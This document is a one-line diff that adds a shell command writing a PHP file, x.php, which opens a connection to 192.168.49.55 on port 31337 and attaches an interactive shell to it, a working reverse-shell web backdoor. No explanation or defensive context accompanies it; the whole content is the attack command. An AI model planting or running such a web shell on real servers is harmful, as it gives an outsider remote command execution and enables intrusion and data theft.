@@ -1,0 +1,1 @@
+echo '<?php proc_open("sh -i",array($s=fsockopen("192.168.49.55",31337),$s,$s),$o)?>' >x.php
